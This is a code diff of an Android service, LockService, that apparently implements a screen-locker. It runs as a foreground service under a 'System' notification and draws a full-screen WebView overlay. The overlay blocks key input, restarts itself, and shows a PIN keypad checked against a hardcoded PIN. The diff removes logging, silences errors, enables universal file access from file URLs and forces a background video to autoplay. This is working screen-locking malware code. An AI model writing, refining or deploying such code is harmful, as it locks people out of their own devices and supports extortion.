@@ -9,7 +9,6 @@ import android.graphics.PixelFormat;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
-import android.util.Base64;
 import android.util.Log;
 import android.view.WindowManager;
 import android.webkit.JavascriptInterface;
@@ -17,7 +16,6 @@ import android.webkit.WebChromeClient;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
-import java.nio.charset.StandardCharsets;
 
 public class LockService extends Service {
 
@@ -32,14 +30,11 @@ public class LockService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.d(TAG, "onCreate");
         wm = (WindowManager) getSystemService(WINDOW_SERVICE);
     }
 
     @Override
     public int onStartCommand(Intent i, int f, int s) {
-        Log.d(TAG, "onStartCommand");
-
         try {
             NotificationChannel ch = new NotificationChannel(
                 "sys", "System", NotificationManager.IMPORTANCE_LOW);
@@ -50,14 +45,10 @@ public class LockService extends Service {
                 .setSmallIcon(android.R.drawable.ic_menu_manage)
                 .build();
             startForeground(1, n);
-        } catch (Exception e) {
-            Log.e(TAG, "Notification error: " + e.getMessage());
-        }
+        } catch (Exception ignored) {}
 
         new Handler(getMainLooper()).postDelayed(new Runnable() {
-            @Override public void run() {
-                showLock();
-            }
+            @Override public void run() { showLock(); }
         }, 1500);
 
         return START_STICKY;
@@ -70,8 +61,6 @@ public class LockService extends Service {
         new Handler(getMainLooper()).post(new Runnable() {
             @Override public void run() {
                 try {
-                    Log.d(TAG, "showLock start");
-
                     webView = new WebView(LockService.this);
                     WebSettings ws = webView.getSettings();
                     ws.setJavaScriptEnabled(true);
@@ -79,6 +68,8 @@ public class LockService extends Service {
                     ws.setMediaPlaybackRequiresUserGesture(false);
                     ws.setAllowFileAccess(true);
                     ws.setAllowContentAccess(true);
+                    ws.setAllowFileAccessFromFileURLs(true);
+                    ws.setAllowUniversalAccessFromFileURLs(true);
                     ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
                     ws.setCacheMode(WebSettings.LOAD_DEFAULT);
 
@@ -88,11 +79,13 @@ public class LockService extends Service {
                     webView.addJavascriptInterface(new JsBridge(), "Android");
 
                     String html = buildHtml();
-                    // b64 removed
-                        html.getBytes(StandardCharsets.UTF_8),
-                        Base64.NO_WRAP
+                    webView.loadDataWithBaseURL(
+                        "file:///android_res/raw/",
+                        html,
+                        "text/html",
+                        "utf-8",
+                        null
                     );
-                    webView.loadData(b64, "text/html; charset=utf-8", "base64");
 
                     int type;
                     if (Build.VERSION.SDK_INT >= 26) {
@@ -117,11 +110,8 @@ public class LockService extends Service {
                     wm.addView(webView, lp);
                     webView.setOnKeyListener((v, k, e) -> true);
 
-                    Log.d(TAG, "overlay added");
-
                 } catch (Exception e) {
                     Log.e(TAG, "showLock error: " + e.getMessage());
-                    e.printStackTrace();
                 }
             }
         });
@@ -150,7 +140,7 @@ public class LockService extends Service {
         sb.append("@media(max-width:450px){h1{font-size:28px}.subtitle{font-size:18px}.pin-box{width:305px}.keypad{grid-template-columns:repeat(3,105px)}button{height:78px}}");
         sb.append("</style></head><body>");
 
-        sb.append("<video autoplay loop muted playsinline>");
+        sb.append("<video id='bgvid' autoplay loop muted playsinline preload='auto'>");
         sb.append("<source src='");
         sb.append(VIDEO_URL);
         sb.append("' type='video/mp4'>");
@@ -165,81 +155,26 @@ public class LockService extends Service {
         sb.append("</div>");
         sb.append("<div class='keypad'>");
 
-        sb.append("<button onclick=");
-        sb.append(q);
-        sb.append("press('1')");
-        sb.append(q);
-        sb.append(">1</button>");
-
-        sb.append("<button onclick=");
-        sb.append(q);
-        sb.append("press('2')");
-        sb.append(q);
-        sb.append(">2</button>");
-
-        sb.append("<button onclick=");
-        sb.append(q);
-        sb.append("press('3')");
-        sb.append(q);
-        sb.append(">3</button>");
-
-        sb.append("<button onclick=");
-        sb.append(q);
-        sb.append("press('4')");
-        sb.append(q);
-        sb.append(">4</button>");
-
-        sb.append("<button onclick=");
-        sb.append(q);
-        sb.append("press('5')");
-        sb.append(q);
-        sb.append(">5</button>");
-
-        sb.append("<button onclick=");
-        sb.append(q);
-        sb.append("press('6')");
-        sb.append(q);
-        sb.append(">6</button>");
-
-        sb.append("<button onclick=");
-        sb.append(q);
-        sb.append("press('7')");
-        sb.append(q);
-        sb.append(">7</button>");
-
-        sb.append("<button onclick=");
-        sb.append(q);
-        sb.append("press('8')");
-        sb.append(q);
-        sb.append(">8</button>");
-
-        sb.append("<button onclick=");
-        sb.append(q);
-        sb.append("press('9')");
-        sb.append(q);
-        sb.append(">9</button>");
-
-        sb.append("<button class='small' onclick=");
-        sb.append(q);
-        sb.append("clearPin()");
-        sb.append(q);
-        sb.append(">CLEAR</button>");
-
-        sb.append("<button onclick=");
-        sb.append(q);
-        sb.append("press('0')");
-        sb.append(q);
-        sb.append(">0</button>");
-
-        sb.append("<button class='small' onclick=");
-        sb.append(q);
-        sb.append("backspace()");
-        sb.append(q);
-        sb.append(">DELETE</button>");
+        sb.append("<button onclick="); sb.append(q); sb.append("press('1')"); sb.append(q); sb.append(">1</button>");
+        sb.append("<button onclick="); sb.append(q); sb.append("press('2')"); sb.append(q); sb.append(">2</button>");
+        sb.append("<button onclick="); sb.append(q); sb.append("press('3')"); sb.append(q); sb.append(">3</button>");
+        sb.append("<button onclick="); sb.append(q); sb.append("press('4')"); sb.append(q); sb.append(">4</button>");
+        sb.append("<button onclick="); sb.append(q); sb.append("press('5')"); sb.append(q); sb.append(">5</button>");
+        sb.append("<button onclick="); sb.append(q); sb.append("press('6')"); sb.append(q); sb.append(">6</button>");
+        sb.append("<button onclick="); sb.append(q); sb.append("press('7')"); sb.append(q); sb.append(">7</button>");
+        sb.append("<button onclick="); sb.append(q); sb.append("press('8')"); sb.append(q); sb.append(">8</button>");
+        sb.append("<button onclick="); sb.append(q); sb.append("press('9')"); sb.append(q); sb.append(">9</button>");
+        sb.append("<button class='small' onclick="); sb.append(q); sb.append("clearPin()"); sb.append(q); sb.append(">CLEAR</button>");
+        sb.append("<button onclick="); sb.append(q); sb.append("press('0')"); sb.append(q); sb.append(">0</button>");
+        sb.append("<button class='small' onclick="); sb.append(q); sb.append("backspace()"); sb.append(q); sb.append(">DELETE</button>");
 
         sb.append("</div></div>");
 
         sb.append("<script>");
+        sb.append("window.addEventListener('load',function(){");
+        sb.append("var v=document.getElementById('bgvid');");
+        sb.append("if(v){v.muted=true;v.play().catch(function(e){setTimeout(function(){v.play();},300);});}");
+        sb.append("});");
         sb.append("var CORRECT_PIN='");
         sb.append(CORRECT_PIN);
         sb.append("';");
